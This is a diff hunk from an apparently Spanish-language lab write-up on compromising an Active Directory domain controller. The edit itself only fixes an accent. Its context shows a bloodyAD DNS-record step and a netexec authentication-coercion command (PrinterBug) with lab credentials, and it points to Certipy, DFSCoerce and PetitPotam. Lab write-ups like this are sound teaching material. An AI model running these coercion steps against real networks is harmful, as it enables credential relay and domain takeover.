@@ -312,7 +312,7 @@ bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl
 [+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
 ```
 
-Luego podemos configurar tal cual como dice en el [repo](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) de certipy podemos usar herramientas de coerción como `DFSCoerce` [https://github.com/Wh04m1001/DFSCoerce](https://github.com/Wh04m1001/DFSCoerce), `PetitPotam` [https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam) , etc. en mi caso use la herramienta `netexec` con el modulo de coerción para realizar el ataque, de manera que este actue de disparador para la autenticación `SMB`
+Luego podemos configurar tal cual como dice en el [repo](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) de certipy podemos usar herramientas de coerción como `DFSCoerce` [https://github.com/Wh04m1001/DFSCoerce](https://github.com/Wh04m1001/DFSCoerce), `PetitPotam` [https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam) , etc. en mi caso use la herramienta `netexec` con el modulo de coerción para realizar el ataque, de manera que este actúe de disparador para la autenticación `SMB`
 
 ```bash
  netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PrinterBug
